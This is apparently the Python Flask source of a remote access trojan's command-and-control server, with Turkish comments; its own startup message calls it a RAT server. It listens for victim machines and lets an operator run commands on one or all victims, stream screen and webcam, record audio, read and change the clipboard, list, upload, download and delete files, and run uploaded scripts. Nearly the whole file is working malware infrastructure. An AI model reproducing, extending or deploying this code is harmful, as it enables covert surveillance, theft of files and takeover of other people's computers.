from flask import Flask, render_template, request, redirect, url_for, jsonify, session, Response
import threading
import socket
import queue
import time
import os
import json
from functools import wraps
import base64
import select
from flask import stream_with_context

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Kullanıcı adı ve şifre (gizlilik için burada tutuluyor, istenirse .env ile de alınabilir)
ADMIN_USER = 'admin'
ADMIN_PASS = 'keanos2025'

# Bağlı istemciler listesi (ID, IP, bağlantı zamanı, socket objesi, sistem bilgisi, son aktivite)
clients = []
clients_lock = threading.Lock()
command_queues = {}

# Etiket & Blacklist yönetimi için basit in-memory veri yapısı
client_tags = {}
client_blacklist = {}

# Giriş kontrol dekoratörü
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == ADMIN_USER and password == ADMIN_PASS:
            session['logged_in'] = True
            return redirect(url_for('index'))
        else:
            return render_template('login.html', error='Hatalı giriş!')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/')
@login_required
def index():
    with clients_lock:
        client_list = [
            {'id': i, 'ip': c['ip'], 'time': c['time'], 'sysinfo': c.get('sysinfo', 'Bilinmiyor'), 'last_seen': c.get('last_seen', '-')}
            for i, c in enumerate(clients)
        ]
    return render_template('index.html', clients=client_list)

@app.route('/client/<int:client_id>')
@login_required
def client_details(client_id):
    with clients_lock:
        if 0 <= client_id < len(clients):
            client = clients[client_id]
            sysinfo = client.get('sysinfo', {})
            client_obj = {
                'id': client_id,
                'ip': client['ip'],
                'time': client['time'],
                'sysinfo': sysinfo,
                'last_seen': client.get('last_seen', '-'),
                'cmd_log': client.get('cmd_log', [])
            }
            return render_template('client_details.html', client=client_obj)
    return redirect(url_for('index'))

@app.route('/send_command', methods=['POST'])
@login_required
def send_command():
    client_id = int(request.form['client_id'])
    command = request.form['command']
    with clients_lock:
        if 0 <= client_id < len(clients):
            q = command_queues.get(client_id)
            if q:
                # Komut geçmişini kaydet
                clients[client_id].setdefault('cmd_log', []).append(command)
                q.put(command)
                return jsonify({'status': 'success'})
    return jsonify({'status': 'error'})

@app.route('/file_list', methods=['POST'])
@login_required
def file_list():
    # Burada gerçek istemciye dosya listesi komutu gönderip cevap beklenebilir
    # Şimdilik örnek html dönülüyor
    html = '<ul><li>test.txt</li><li>secret.docx</li></ul>'
    return jsonify({'html': html})

@app.route('/screenshot', methods=['POST'])
@login_required
def screenshot():
    # Burada gerçek istemciye ekran görüntüsü komutu gönderip cevap beklenebilir
    return jsonify({'img': ''})

@app.route('/webcam', methods=['POST'])
@login_required
def webcam():
    # Burada gerçek istemciye webcam komutu gönderip cevap beklenebilir
    return jsonify({'img': ''})

@app.route('/audio_record', methods=['POST'])
@login_required
def audio_record():
    client_id = int(request.form['client_id'])
    duration = int(request.form.get('duration', 10))
    with clients_lock:
        if 0 <= client_id < len(clients):
            conn = clients[client_id]['conn']
            if conn:
                try:
                    conn.send(f'record_audio {duration}'.encode())
                    data = conn.recv(4096).decode(errors='ignore')
                    if data.startswith('[AUDIO] '):
                        url = data.split(' ', 1)[1]
                        return jsonify({'url': url})
                except Exception as e:
                    pass
    return jsonify({'url': ''})

@app.route('/stream/<string:type>/<int:client_id>')
@login_required
def stream_video(type, client_id):
    def generate():
        with clients_lock:
            if 0 <= client_id < len(clients):
                conn = clients[client_id]['conn']
                if conn is None:
                    yield b''
                    return
        # Komutu gönder
        if type == 'screen':
            conn.send(b'stream_screen')
        elif type == 'webcam':
            conn.send(b'stream_webcam')
        else:
            yield b''
            return
        # Stream döngüsü
        try:
            while True:
                # İlk mesaj: [STREAM_SCREEN] <size> veya [STREAM_WEBCAM] <size>
                header = conn.recv(64).decode(errors='ignore')
                if header.startswith('[STREAM_SCREEN_END') or header.startswith('[STREAM_WEBCAM_END'):
                    break
                if '[STREAM_SCREEN]' in header or '[STREAM_WEBCAM]' in header:
                    size = int(header.split()[-1])
                    data = b''
                    while len(data) < size:
                        chunk = conn.recv(size - len(data))
                        if not chunk:
                            break
                        data += chunk
                    yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + data + b'\r\n')
        except Exception as e:
            pass
    return Response(stream_with_context(generate()), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/processes', methods=['POST'])
@login_required
def processes():
    client_id = int(request.form['client_id'])
    with clients_lock:
        if 0 <= client_id < len(clients):
            conn = clients[client_id]['conn']
            if conn:
                try:
                    conn.send(b'list_processes')
                    data = conn.recv(8192).decode(errors='ignore')
                    if data.startswith('[PROCESSES] '):
                        plist = data[len('[PROCESSES] '):].split(';')
                        return jsonify({'processes': plist})
                except Exception as e:
                    pass
    return jsonify({'processes': []})

@app.route('/get_clipboard', methods=['POST'])
@login_required
def get_clipboard():
    client_id = int(request.form['client_id'])
    with clients_lock:
        if 0 <= client_id < len(clients):
            conn = clients[client_id]['conn']
            if conn:
                try:
                    conn.send(b'get_clipboard')
                    data = conn.recv(4096).decode(errors='ignore')
                    if data.startswith('[CLIPBOARD] '):
                        cb = data[len('[CLIPBOARD] '):]
                        return jsonify({'clipboard': cb})
                except Exception as e:
                    pass
    return jsonify({'clipboard': ''})

@app.route('/set_clipboard', methods=['POST'])
@login_required
def set_clipboard():
    client_id = int(request.form['client_id'])
    value = request.form.get('clipboard','')
    with clients_lock:
        if 0 <= client_id < len(clients):
            conn = clients[client_id]['conn']
            if conn:
                try:
                    conn.send(f'set_clipboard {value}'.encode())
                    data = conn.recv(4096).decode(errors='ignore')
                    if '[CLIPBOARD] Ayarlandı' in data:
                        return jsonify({'status':'Ayarlandı'})
                    else:
                        return jsonify({'status':'Hata'})
                except Exception as e:
                    pass
    return jsonify({'status':'Hata'})

@app.route('/listdir', methods=['POST'])
@login_required
def listdir():
    client_id = int(request.form['client_id'])
    path = request.form.get('path','')
    with clients_lock:
        if 0 <= client_id < len(clients):
            conn = clients[client_id]['conn']
            if conn:
                try:
                    conn.send(f'listdir {path}'.encode())
                    data = conn.recv(65536).decode(errors='ignore')
                    if data.startswith('[DIR] '):
                        entries = json.loads(data[6:])
                        return jsonify({'entries': entries})
                except Exception as e:
                    pass
    return jsonify({'entries': []})

@app.route('/delete', methods=['POST'])
@login_required
def delete():
    client_id = int(request.form['client_id'])
    path = request.form.get('path','')
    with clients_lock:
        if 0 <= client_id < len(clients):
            conn = clients[client_id]['conn']
            if conn:
                try:
                    conn.send(f'delete {path}'.encode())
                    data = conn.recv(4096).decode(errors='ignore')
                    if '[DELETE] OK' in data:
                        return jsonify({'status':'Silindi'})
                    else:
                        return jsonify({'status':'Hata'})
                except Exception as e:
                    pass
    return jsonify({'status':'Hata'})

@app.route('/upload', methods=['POST'])
@login_required
def upload():
    client_id = int(request.form['client_id'])
    dest = request.form.get('dest','')
    file = request.files.get('file')
    if not file or not dest:
        return jsonify({'status':'Eksik bilgi'})
    import base64
    b64data = base64.b64encode(file.read()).decode()
    with clients_lock:
        if 0 <= client_id < len(clients):
            conn = clients[client_id]['conn']
            if conn:
                try:
                    conn.send(f'upload {dest} {b64data}'.encode())
                    data = conn.recv(4096).decode(errors='ignore')
                    if '[UPLOAD] OK' in data:
                        return jsonify({'status':'Yüklendi'})
                    else:
                        return jsonify({'status':'Hata'})
                except Exception as e:
                    pass
    return jsonify({'status':'Hata'})

@app.route('/download')
@login_required
def download():
    client_id = int(request.args.get('client_id',0))
    path = request.args.get('path','')
    with clients_lock:
        if 0 <= client_id < len(clients):
            conn = clients[client_id]['conn']
            if conn:
                try:
                    conn.send(f'download {path}'.encode())
                    data = conn.recv(65536)
                    if data.startswith(b'[FILE] '):
                        import base64
                        import io
                        b64 = data[7:].split(b' ',1)[0]
                        fname = os.path.basename(path)
                        filedata = base64.b64decode(b64)
                        return Response(filedata, mimetype='application/octet-stream', headers={'Content-Disposition': f'attachment; filename={fname}'})
                except Exception as e:
                    pass
    return 'Hata', 400

@app.route('/run_script', methods=['POST'])
@login_required
def run_script():
    client_id = int(request.form['client_id'])
    script_type = request.form.get('type','py')
    script_file = request.files.get('script')
    if not script_file:
        return jsonify({'error':'Dosya yok'})
    import base64
    script_data = base64.b64encode(script_file.read()).decode()
    with clients_lock:
        if 0 <= client_id < len(clients):
            conn = clients[client_id]['conn']
            if conn:
                try:
                    # Komut: run_script <type> <base64>
                    conn.send(f'run_script {script_type} {script_data}'.encode())
                    data = conn.recv(65536).decode(errors='ignore')
                    if data.startswith('[SCRIPT_RESULT] '):
                        result = data[len('[SCRIPT_RESULT] '):]
                        return jsonify({'result': result})
                    else:
                        return jsonify({'error':'Çalıştırma hatası'})
                except Exception as e:
                    return jsonify({'error':'Bağlantı hatası'})
    return jsonify({'error':'İstemci yok'})

@app.route('/bulk_command', methods=['POST'])
@login_required
def bulk_command():
    cmd = request.form.get('cmd','')
    if not cmd:
        return jsonify({'status':'Komut yok'})
    count = 0
    with clients_lock:
        for client in clients:
            conn = client.get('conn')
            if conn:
                try:
                    conn.send(cmd.encode())
                    # İsteğe bağlı: cevap beklenebilir
                    # resp = conn.recv(4096)
                    count += 1
                except Exception as e:
                    pass
    return jsonify({'status': f'{count} istemciye gönderildi'})

@app.route('/get_tags')
@login_required
def get_tags():
    client_id = int(request.args.get('client_id',0))
    tags = client_tags.get(client_id, [])
    return jsonify({'tags': tags})

@app.route('/add_tag', methods=['POST'])
@login_required
def add_tag():
    client_id = int(request.form['client_id'])
    tag = request.form.get('tag','').strip()
    if tag:
        client_tags.setdefault(client_id,[])
        if tag not in client_tags[client_id]:
            client_tags[client_id].append(tag)
    return ('',204)

@app.route('/get_blacklist')
@login_required
def get_blacklist():
    client_id = int(request.args.get('client_id',0))
    items = client_blacklist.get(client_id, [])
    return jsonify({'items': items})

@app.route('/add_blacklist', methods=['POST'])
@login_required
def add_blacklist():
    client_id = int(request.form['client_id'])
    item = request.form.get('item','').strip()
    if item:
        client_blacklist.setdefault(client_id,[])
        if item not in client_blacklist[client_id]:
            client_blacklist[client_id].append(item)
    return ('',204)

# TCP Sunucu Thread'i
def tcp_server():
    HOST = '0.0.0.0'
    PORT = 5000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen()
    print(f"[*] TCP RAT Sunucusu {PORT} portunda dinliyor...")
    while True:
        conn, addr = s.accept()
        # İstemciden sistem bilgisi al
        try:
            conn.settimeout(5)
            sysinfo_raw = conn.recv(2048).decode(errors='ignore')
            if sysinfo_raw.startswith('SYSINFO:'):
                sysinfo = json.loads(sysinfo_raw[8:])
            else:
                sysinfo = {}
        except:
            sysinfo = {}
        finally:
            conn.settimeout(None)
        client_info = {'ip': addr[0], 'time': time_now(), 'conn': conn, 'sysinfo': sysinfo, 'last_seen': time_now()}
        with clients_lock:
            clients.append(client_info)
            command_queues[len(clients)-1] = queue.Queue()
        threading.Thread(target=handle_client, args=(conn, len(clients)-1), daemon=True).start()

def time_now():
    return time.strftime('%Y-%m-%d %H:%M:%S')

def handle_client(conn, client_id):
    q = command_queues[client_id]
    try:
        while True:
            try:
                command = q.get(timeout=0.5)
                conn.send(command.encode())
                data = conn.recv(4096)
                print(f"[Cevap] {data.decode(errors='ignore')}")
                with clients_lock:
                    clients[client_id]['last_seen'] = time_now()
            except queue.Empty:
                continue
    except Exception as e:
        print(f"[!] İstemci {client_id} bağlantısı koptu: {e}")
    finally:
        conn.close()
        with clients_lock:
            clients[client_id]['conn'] = None

if __name__ == '__main__':
    threading.Thread(target=tcp_server, daemon=True).start()
    app.run(host='0.0.0.0', port=8000, debug=False)
